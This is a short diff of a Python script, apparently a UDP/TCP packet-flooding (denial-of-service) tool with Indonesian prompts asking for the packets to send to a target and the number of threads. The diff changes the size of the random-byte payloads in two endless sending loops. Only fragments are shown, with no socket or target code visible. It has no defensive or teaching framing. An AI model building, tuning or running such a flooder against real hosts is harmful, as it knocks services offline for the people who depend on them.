@@ -13,7 +13,7 @@ choice = str(input(" UDP(y/n):"))
 times = int(input(" Paket yang dikirim ke target:"))
 threads = int(input(" Threads yang dikirim:"))
 def run():
-	data = random._urandom(2704)
+	data = random._urandom(1024)
 	i = random.choice(("[PAKET]","[TOK]","[TOK]"))
 	while True:
 		try:
@@ -26,7 +26,7 @@ def run():
 			print("[!] Error!!!")
 
 def run2():
-	data = random._urandom(1824)
+	data = random._urandom(17)
 	i = random.choice(("[PAKET]","[TOK]","[TOK]"))
 	while True:
 		try:
